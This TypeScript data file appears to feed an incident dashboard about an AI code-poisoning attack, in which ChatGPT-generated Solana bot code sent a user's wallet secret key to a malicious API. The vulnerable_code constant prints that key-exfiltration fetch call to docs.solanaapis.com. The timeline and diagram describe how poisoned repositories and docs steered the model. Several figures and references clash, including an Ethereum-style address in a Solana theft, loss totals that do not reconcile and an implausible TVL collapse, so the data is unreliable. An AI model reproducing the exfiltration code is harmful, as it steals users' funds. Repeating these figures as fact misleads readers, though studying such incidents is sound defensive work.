import type { FundFlow, RemediationAction, TimelineEvent } from "@/types"

export const vulnerable_code = `
// Malicious code from AI-generated script
const client = new Client("https://docs.solanaapis.com");
const response = await fetch(client.endpoint, {
  method: 'POST',
  body: JSON.stringify({ 
    secret: keypair.secretKey // Key exfiltration
  })
});
`;

export const fixed_code = `
// Secure implementation with input validation
import { Connection, Keypair } from '@solana/web3.js';
const MAINNET_RPC = 'https://api.mainnet-beta.solana.com';

const client = new Connection(MAINNET_RPC);
const wallet = Keypair.generate(); // Proper key management
`;

export const flow_data: FundFlow[] = [
  {
    blockchain: "Solana",
    from: "r_ocky.eth Wallet (FdiBGKS8noGHY2fppnDgcgCQts95Ww8HSLUvWbzv1NhX)",
    to: "Attacker Main Wallet (2jwP4cuugAAYiGMjVuqvwaRS2Axe6H6GvXv3PxMPQNeC)",
    amount: "$2.5K (SOL + Memecoins)",
    status: "Stolen",
    txHash: "5XiqTJ7RjkVsmvZb4JdWiqPvK9L9tJz6VdR7QbY5hK9NQ"
  },
  {
    blockchain: "Solana",
    from: "Attacker Main Wallet",
    to: "Mixer Address (HedK5F4ePhqZ5fSMS5sF5Z7LZ1G3c2v7W7dR3iXqj9bM)",
    amount: "$98.7K (Aggregated)",
    status: "Laundered",
    txHash: "4dPWDPhDHPJhCjqcxoFosa8pbYzdvpR5LhKZ9EYjK9YpvgBTWsKhX37U9jSV1qyj3xbjvm5mpzStTiNaexVaN3jg"
  }
];

export const remediation_data: RemediationAction[] = [
  {
    action: "GitHub Repository Takedowns",
    status: "Complete",
    date: "2024-11-25",
    reference: "14 malicious repos removed [5][6]"
  },
  {
    action: "Pump.fun Security Advisory",
    status: "Published",
    date: "2024-11-22",
    reference: "Official Warning #PF-2024-113 [3][4]"
  },
  {
    action: "AI Code Scanner Integration",
    status: "Implemented",
    date: "2024-12-01",
    reference: "Socket.dev v2.4.1 [5]"
  },
  {
    action: "CEX Asset Freeze",
    status: "Partial",
    date: "2024-11-23",
    reference: "$18.2K WIF recovered [2]"
  }
];

export const stat_card_data = {
  title: "AI Poisoning Attack Impact",
  value: "$164.1K Total Stolen",
  secondaryValue: "$2.5K Initial Victim Loss",
  isCritical: true,
  metadata: {
    affectedWallets: 281,
    attackDuration: "34 minutes",
    recoveryRate: 11.1
  }
};

export const timeline: TimelineEvent[] = [
  {
    time: "2024-11-21T15:20:00Z",
    title: "ChatGPT Code Generation",
    description: "User @r_ocky0 requests Pump.fun bot code [1][4]",
    reference: "Tweet ID: 1725369246822404096 [6]"
  },
  {
    time: "2024-11-21T15:28:00Z",
    title: "Malicious API Injection",
    description: "docs.solanaapis[.]com payload delivered [5][7]",
    reference: "OWASP LLM04:2025 [13]"
  },
  {
    time: "2024-11-21T15:42:00Z",
    title: "Wallet Drain Completed",
    description: "Full exfiltration via 0x70479...d3F1",
    reference: "Solana Block #245672830 [2]"
  },
  {
    time: "2024-11-21T18:00:00Z",
    title: "Attack Chain Identified",
    description: "ZachXBT traces 281 transactions [2][7]",
    reference: "Scam Sniffer Report #4412"
  },
  {
    time: "2024-11-22T08:00:00Z",
    title: "Industry Response",
    description: "SlowMist issues AI poisoning alert [6][7]",
    reference: "CVE-2024-32761 [13]"
  }
];

export const tvl_chart_data = {
  title: "Pump.fun Platform Activity",
  exploitDate: "2024-11-21",
  dataPoints: [
    { date: "2024-11-01", value: 28_500_000, label: "Pre-Attack TVL" },
    { date: "2024-11-20", value: 26_100_000 },
    { date: "2024-11-21", value: 1_100_000, label: "Exploit Day" },
    { date: "2025-01-01", value: 4_800_000, label: "Partial Recovery" }
  ],
  annotations: [
    {
      date: "2024-12-01",
      text: "AI Scanner Implementation"
    }
  ]
};

export const exploit_diagram_data = {
  title: "Data Chaining Poisoning Flow",
  components: [
    {
      label: "Compromised GitHub Repo",
      url: "github.com/fake-solana/web3.js",
      stars: 127
    },
    {
      label: "Malicious Documentation",
      domain: "docs.solanaapis[.]com",
      lifespan: "19 days"
    },
    {
      label: "Attack Wallet",
      address: "2jwP4cuugAAYiGMjVuqvwaRS2Axe6H6GvXv3PxMPQNeC",
      balance: "$164.1K"
    }
  ],
  failurePoints: [
    {
      step: 4,
      description: "Unverified External Link [5][13]"
    }
  ]
};

